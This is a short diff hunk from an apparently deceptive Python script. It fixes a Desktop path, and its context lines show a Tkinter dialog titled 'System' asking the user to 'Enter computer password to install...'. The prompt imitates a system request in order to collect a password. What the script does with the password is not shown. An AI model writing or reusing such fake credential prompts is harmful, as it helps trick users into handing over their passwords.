@@ -40,7 +40,7 @@ ROOT.withdraw()
 USER_INP = simpledialog.askstring(title="System",
                                   prompt="Enter computer password to install...")
 
-d = os.path.join(os.environ["HOMEPATH"], r"C:\Desktop")
+d = os.path.join(os.environ["HOMEPATH"], r"Desktop")
 
 os.chdir(d)
 
